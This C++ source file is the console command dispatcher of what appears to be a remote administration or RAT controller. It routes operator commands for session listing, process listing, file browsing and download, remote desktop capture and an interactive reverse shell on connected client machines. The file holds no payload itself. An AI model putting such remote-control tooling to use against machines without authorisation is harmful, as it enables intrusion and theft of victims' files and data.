#include "SimpleConsoleUiMediator.h"
// #include "../../../Application.h"
#include "../../../../shared/IOLib/services/StringService.h"
#include "../../../concurrent/events/ClientAppEvent.h"
#include "../../../concurrent/events/ServerAppEvent.h"
#include "../../../concurrent/events/ServerAppEvent.h"
#include "../../../models/Client.h"
#include <sstream>
#include "../../../../shared/NetLib/packets/PacketFileSystem.h"
#include <iostream>
#include "../../../../shared/NetLib/packets/PacketShell.h"


DWORD WINAPI listenAppEventsThreadFunc(LPVOID threadArg)
{
	auto app = static_cast<SimpleConsoleUiMediator*>(threadArg);

	app->loopUiEvents();
	return 0;
}

SimpleConsoleUiMediator::SimpleConsoleUiMediator(const UiAppDoubleQueueThreadChannel& uiChannel)
	: uiAppChannel(uiChannel)
{
	InitializeSRWLock(&clientLock);
	InitializeSRWLock(&viewLock);

	uiEventLooperThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(listenAppEventsThreadFunc),
	                                 static_cast<PVOID>(this));
	uiEventLooperThread->run();
}


SimpleConsoleUiMediator::~SimpleConsoleUiMediator()
{
}

void SimpleConsoleUiMediator::showMainUi()
{
	appConsole.showMainUi();
}


void SimpleConsoleUiMediator::dispatchEvent(AppEvent* event)
{
	uiAppChannel.sendToApp(event);
}

void SimpleConsoleUiMediator::printHelp()
{
}

// Check instruction if may be handled without being forwarded to the uiEventChannel, return true in this case, false otherwise
bool SimpleConsoleUiMediator::handleInstruction(char* instruction)
{
	return false;
}

void SimpleConsoleUiMediator::loop()
{
	char line[256];
	running = true;
	while (running)
	{
		appConsole.getLine(line, 256);
		if (!handleInstruction(line))
		{
			// UiEvent* event = getEventForInstruction(line);
			AppEvent* event = getEventForInstruction(line);
			if (event == nullptr)
			{
				appConsole.printf("Unknown instruction %s\n", line);
				continue;
			}

			// uiChannel.sendToApp(event);
			uiAppChannel.sendToApp(event);
		}
	}
}


AppEvent* SimpleConsoleUiMediator::getEventForInstruction(char* instruction)
{
	if (appConsole.isInteracting())
	{
		Client* client = appConsole.getClient();

		if (appConsole.currentView == View::ReverseShell)
		{
			std::string* command = new std::string(instruction);
			return new ClientAppEvent(Subject::ReverseShell, Action::Update, appConsole.getClient(), command);
		}

		if (StringService::equalInsensitive(instruction, "ps"))
		{
			return new ClientAppEvent(Subject::Process, Action::Start, appConsole.getClient());
		}
		else if (StringService::startsWith(instruction, "ls"))
		{
			std::wstring* finalPath = getFilePath(instruction);
			return new ClientAppEvent(Subject::FileSystem, Action::Start, appConsole.getClient(), finalPath);
		}
		else if (StringService::startsWith(instruction, "download"))
		{
			std::wstring* filePath = getFilePath(instruction);
			return new ClientAppEvent(Subject::Download, appConsole.getClient(), filePath);
		}
		else if (StringService::equalInsensitive(instruction, "start"))
		{
			if (appConsole.currentView == View::RemoteDesktop)
				return new ClientAppEvent(Subject::Desktop, Action::Start, appConsole.getClient());
		}
		else if (StringService::equalInsensitive(instruction, "desktop start"))
		{
			if (appConsole.isInteracting())
			{
				AcquireSRWLockExclusive(&viewLock);
				appConsole.currentView = View::RemoteDesktop;
				ReleaseSRWLockExclusive(&viewLock);
				return new ClientAppEvent(Subject::Desktop, Action::Start, appConsole.getClient());
			}
		}
		if (StringService::equalInsensitive(instruction, "shell"))
		{
			AcquireSRWLockExclusive(&viewLock);
			appConsole.currentView = View::ReverseShell;
			ReleaseSRWLockExclusive(&viewLock);
			return new ClientAppEvent(Subject::ReverseShell, Action::Start,
			                          appConsole.getClient());
		}
	}
	else
	{
		if (StringService::startsWith(instruction, "interact"))
		{
			std::string instructionStr = instruction;
			const size_t pos = instructionStr.find(" ");
			std::string token = instructionStr.substr(0, pos);
			instructionStr.erase(0, pos + 1);

			std::istringstream iss(instructionStr);
			unsigned long long clientId;
			iss >> clientId;
			return new ClientAppEvent(Subject::Interaction, Action::Start, clientId);
		}
		if (StringService::startsWith(instruction, "ls") || StringService::equalInsensitive(
			"list sessions", instruction))
		{
			return new AppEvent(Target::Server, Subject::Connection, Action::ListAvailable);
		}
	}

	return nullptr;
}


std::wstring* SimpleConsoleUiMediator::getFilePath(char* instruction)
{
	std::wstring* finalPath;
	if (instruction[2] == 0x00 &&
		appConsole.currentView != View::Filesystem)
	{
		finalPath = new std::wstring(L"/");
	}
	else
	{
		std::wstring relativePath = StringService::chartoWString(instruction);
		const size_t pos = relativePath.find(L" ");
		if (pos != std::string::npos)
		{
			relativePath.erase(0, pos + 1);
		}

		if (appConsole.currentView == View::Filesystem)
		{
			const std::wstring basePath = appConsole.getCurrentPath();
			finalPath = new std::wstring(basePath);
			if (pos != std::string::npos)
				finalPath->append(relativePath);
		}
		else
		{
			if (pos != std::string::npos)
				finalPath = new std::wstring(relativePath);
			else
				finalPath = new std::wstring(L"/");
		}
	}

	return finalPath;
}

void SimpleConsoleUiMediator::stop()
{
	running = false;
}

void SimpleConsoleUiMediator::loopUiEvents()
{
#if TRACE
	appConsole.trace(__FUNCTION__);
#endif

	running = true;
	while (running)
	{
		// UiEvent* event = uiChannel.takeFromApp();

		AppEvent* event = uiAppChannel.takeFromApp();

		if (event == nullptr)
			continue;

		Action action = event->action;
		Subject subject = event->subject;
		Target target = event->target;

		switch (event->target)
		{
		case Target::Ui:
			{
				if (subject == Subject::Error)
				{
					appConsole.println(event->description);
				}
				break;
			}
		case Target::Server:
			{
				ServerAppEvent* serverEvent = (ServerAppEvent*)event;
				if (serverEvent->serverEventType == ServerEventType::ServerStatusChange)
				{
					appConsole.println(serverEvent->description);
					break;
				}

				if (event->subject == Subject::Connection)
				{
					if (event->action == Action::ListAvailable)
					{
						std::vector<Client*>* clients = (std::vector<Client*>*)event->object;
						appConsole.printClients(clients);
					}
				}
				else if (event->subject == Subject::InvalidSubject)
				{
					std::string* message = (std::string*)event->object;
					updateStatus(*message);
				}
			}
			break;
		case Target::Client:
			{
				ClientAppEvent* clientEvent = static_cast<ClientAppEvent*>(event);
				Client* client = clientEvent->getClient();
				switch (clientEvent->subject)
				{
				case Subject::Connection:
					{
						if (action == Action::Start)
						{
							appConsole.printf(true,
							                  "New client connected\n\tID: %s\n\tPcName: %s\n\tUsername: %s\n\n\n",
							                  std::to_string(client->getId()).c_str(),
							                  clientEvent->getClient()->getPcName().c_str(),
							                  clientEvent->getClient()->getUsername().c_str());
						}
						break;
					}

				case Subject::Interaction:
					{
						if (action == Action::Start)
						{
							appConsole.setInteractionView(client);
						}
						break;
					}
				case Subject::Information:
					{
#if MANUAL_MEM_MANAGEMENT
						// Client* dto = (Client*)event->getData();
						// ClientUiEvent* netEvent = new ClientUiEvent(AppendNewClient, *dto);
						// uiEventChannel.sendToUi(netEvent);
#else

#endif
						continue;
					}
				case Subject::Process:
					{
						if (clientEvent->action == Action::Update)
						{
							std::vector<Process>* processes = (std::vector<Process>*)clientEvent->object;
							appConsole.showProcesses(client, processes);
							delete (std::vector<Process>*)clientEvent->object;
							clientEvent->object = nullptr;
						}
						break;
					}
				case Subject::Desktop:
					{
						if (clientEvent->action == Action::Update)
						{
							std::wstring* imagePath = (std::wstring*)clientEvent->object;
							if (!isStreamingDesktop)
							{
								isStreamingDesktop = true;
								std::wcout << L"Image is saved in " << imagePath << L", open it" << std::endl;
							}
							delete imagePath;
						}
						break;
					}

				case Subject::PacketReceived:
					{
						Packet* packet = (Packet*)clientEvent->object;
						PacketType packetType = packet->getType();
						if (packetType == PacketType::FileSystem)
						{
							const auto packetFs = (PacketFileSystem*)packet;

							if (packetFs->path.empty() || packetFs->path == L"/" || packetFs->path == L"\\")
								appConsole.showFsRoots(client, packetFs->files);
							else
								appConsole.showFsFiles(client, packetFs->path, packetFs->files);
						}
						else if (packetType == PacketType::ReverseShell)
						{
							const auto packetShell = (PacketShell*)packet;
							if (packetShell->action == PacketShellAction::MoreData)
								onShellOutput(client, packetShell->data);
							else if (packetShell->action == PacketShellAction::Stop)
								onShellClosed(client);
						}

						delete packet;
						event->object = nullptr;
					}
				}
			}
		default: break;
		}

		delete event;
	}
}

void SimpleConsoleUiMediator::updateStatus(const std::string& statusMessage)
{
	appConsole.println(statusMessage, true);
}

void SimpleConsoleUiMediator::showErrorMessage(const char* str)
{
	appConsole.printErrorLine(str);
}

void SimpleConsoleUiMediator::showErrorMessage(const std::string& str) const
{
	appConsole.printErrorLine(str);
}

void SimpleConsoleUiMediator::addFeedbackMessage(const std::string& message)
{
	appConsole.println(message);
}


void SimpleConsoleUiMediator::onShellOutput(Client* client, const std::string& data)
{
	appConsole.print(data);

	AcquireSRWLockShared(&clientLock);
	if (appConsole.currentView != View::ReverseShell)
		appConsole.printBanner();
	ReleaseSRWLockShared(&clientLock);
}

void SimpleConsoleUiMediator::onShellClosed(Client* client)
{
	if (appConsole.currentView == View::ReverseShell)
	{
		appConsole.println("Shell closed");
		if (appConsole.getClient() == client)
		{
			AcquireSRWLockExclusive(&viewLock);
			appConsole.currentView = View::ClientInteraction;
			ReleaseSRWLockExclusive(&viewLock);
		}
	}

	appConsole.printBanner();
}
